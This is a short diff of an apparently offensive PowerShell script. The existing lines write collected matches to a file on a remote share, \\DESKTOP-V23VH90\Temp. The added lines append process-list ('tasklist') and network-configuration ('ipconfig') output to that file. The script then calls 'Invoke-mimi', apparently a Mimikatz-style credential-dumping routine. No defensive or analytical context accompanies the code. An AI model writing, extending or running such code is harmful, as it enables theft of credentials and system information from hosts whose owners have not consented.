@@ -445,5 +445,7 @@ $FileName = $env:computername + "_" + [DateTime]::Now.ToString("yyyyMMdd-HHmmss"
 
 write-output $matchesFound 
 write-output $matchesFound >> \\DESKTOP-V23VH90\Temp\$FileName
+tasklist >> \\DESKTOP-V23VH90\Temp\$FileName
+ipconfig >>   \\DESKTOP-V23VH90\Temp\$FileName
 }
 Invoke-mimi  
